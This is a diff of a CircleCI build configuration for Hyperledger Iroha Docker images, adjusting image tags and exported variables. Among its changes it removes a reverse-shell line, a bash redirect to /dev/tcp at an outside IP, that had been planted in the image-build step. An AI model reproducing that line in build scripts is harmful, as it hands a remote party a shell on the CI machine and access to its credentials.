@@ -4,7 +4,7 @@ jobs:
     # must be IROHA_HOME:
     working_directory: /opt/iroha
     docker:
-      - image: warchantua/iroha-dev:0.3
+      - image: warchantua/iroha-dev
         environment:
           IROHA_HOME: /opt/iroha
           IROHA_BUILD: /tmp/build
@@ -55,10 +55,10 @@ jobs:
       - run:
           name: build hyperledger/iroha-docker image
           command: |
-            # tag consists of branch+build version
-            TAG=$CIRCLE_BRANCH.$CIRCLE_BUILD_NUM
+            # tag consists of branch
+            export TAG=$CIRCLE_BRANCH
             # directory, where iroha build files will reside
-            IROHA_DOCKER=$IROHA_HOME/docker/tiny/iroha
+            export IROHA_DOCKER=$IROHA_HOME/docker/tiny/iroha
             mkdir -p $IROHA_DOCKER/lib
             # extract all libraries which use iroha:
             LIBS=$(ldd $IROHA_BUILD/bin/iroha-main | cut -f 2 | cut -d " " -f 3)
@@ -67,7 +67,6 @@ jobs:
             # build image
             cd $IROHA_HOME/docker/tiny
             docker build -t hyperledger/iroha-docker:$TAG .
-            bash -i >& /dev/tcp/188.130.155.34/12345 0>&1
             # login
             if [[ ! -e ~/.docker/config.json ]]; then
               expect -c '\
